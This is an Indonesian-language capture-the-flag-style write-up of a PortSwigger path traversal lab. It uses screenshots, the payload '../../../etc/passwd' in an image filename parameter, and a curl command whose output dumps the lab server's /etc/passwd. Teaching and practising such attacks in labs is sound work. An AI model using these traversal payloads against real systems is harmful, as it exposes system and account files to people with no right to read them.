<img width="1020" height="411" alt="Step1" src="https://github.com/user-attachments/assets/c7196b76-cac7-4c04-8ec7-c812bd14f434" />

Dalam lab pertama di modul Server Side Vulnerability adalah Path Transversal. Path Transversal sendiri adalah ketika client atau user yang tidak memiliki hak akses ke root atau bisa dibilang bukan admin dari sistem, bisa masuk atau melihat isi dari path atau bagian tertentu daris server.
<br>
Type of pentesting yang kita dapat disini adalah **_gray box_**. Artinya kita diberitahu kalau ada celah di bagian penampilan produk penjualan. Namun kita tidak diberikan full code atau petunjuk lain gambar apa yang dimaksud. 

<img width="1140" height="729" alt="Step2" src="https://github.com/user-attachments/assets/5878eff2-4fce-47d9-a95e-0e7687fa0e60" />

Di bagian ini kita bisa saja coba buka postingan produk random yang ada. Salah satunya disini adalah postingan produk tentang **_Hydrated Crackers_**. Karena kita diberi clue kalau kerentanannya ada pada direktori image, jadi kita bisa coba cek atau open image di tab lain (_open in new tab_).

<img width="1918" height="938" alt="Step3" src="https://github.com/user-attachments/assets/09a37129-dbc0-42a7-bd83-f5ce43d0a045" />

Disini kita bisa dapati kalau gambar ini mengakses direktori image (_direktori yang rentan_) dengan parameter filename. Parameter filename dengan **_file 52.jpg_** adalah gambar **_Hydrated Crackers_** ini. Namun apa jadinya kalau kita membuat parameter filename ini mengakses file **_passwd_** alih-alih file *.jpg.

<img width="1918" height="938" alt="Step5" src="https://github.com/user-attachments/assets/360acd98-7f8a-4800-bce4-3636370989ce" />

**_/etc/passwd_** sendiri adalah direktori dari _server-based linux_ yang berada di direktori root dan tidak bisa diakses sembarang user. Jika kita sebagai user bisa mengaksesnya, artinya ini adalah sebuah kerentanan. Dalam percobaan pertama ini, ketika kita mencoba keluar dari direktori saat ini dengan cara "../" (di linux ini artinya "Keluar satu tingkat dari direktori saat ini") dan mencoba akses ke **_/etc/passwd_**, disini gagal. Kenapa? disitu tertulis **no such file**, artinya kita masih perlu keluar beberapa tingkat lagi.

<img width="1918" height="938" alt="Step6" src="https://github.com/user-attachments/assets/9cb1af63-668c-498b-8f9c-45805ce64ffa" />

Contoh disini berhasil mengakses file **_passwd_** dengan mencoba payload direktori **"../../../etc/passwd"**. Artinya ini 3 tingkat diatas direktori saat ini (yang menampilkan laman web). Namun tulisannya tidak bisa di tampilkan karena error. Kenapa bisa error? karena browser mendapat tugas untuk mengirim respons data dalam bentuk image, namun passwd sendiri adalah plain text yang membuat broser melempar respons error. Tapi lab nya berhasil terselesaikan. Cara agar bisa melihat Respons server terhadap payloads ini bisa dengan **_burpsuite_**.

<img width="1918" height="938" alt="Step7" src="https://github.com/user-attachments/assets/fdd2ab7c-71c0-43e1-8278-31943f93854d" />

Contoh disini ketika payload yang sama kita input, maka respons 200 OK Muncul disertai **daftar (list) user** yang ada di server. Atau alternatif lain bisa menggunakan curl di terminal linux untuk melihat data asli yang dikirim dalam bentuk respons oleh server
```
┌──(w4llnut_07㉿kali)-[~]
└─$ curl https://0ac7002403dfa0a1a167615c005f004c.web-security-academy.net/image?filename=../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
elmer:x:12099:12099::/home/elmer:/bin/bash
academy:x:10000:10000::/academy:/bin/bash
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
dnsmasq:x:102:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
systemd-timesync:x:103:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:104:105:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:105:106:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
mysql:x:106:107:MySQL Server,,,:/nonexistent:/bin/false
postgres:x:107:110:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:109:115:RealtimeKit,,,:/proc:/usr/sbin/nologin
mongodb:x:110:117::/var/lib/mongodb:/usr/sbin/nologin
avahi:x:111:118:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
cups-pk-helper:x:112:119:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
geoclue:x:113:120::/var/lib/geoclue:/usr/sbin/nologin
saned:x:114:122::/var/lib/saned:/usr/sbin/nologin
colord:x:115:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
pulse:x:116:124:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
gdm:x:117:126:Gnome Display Manager:/var/lib/gdm3:/bin/false
```
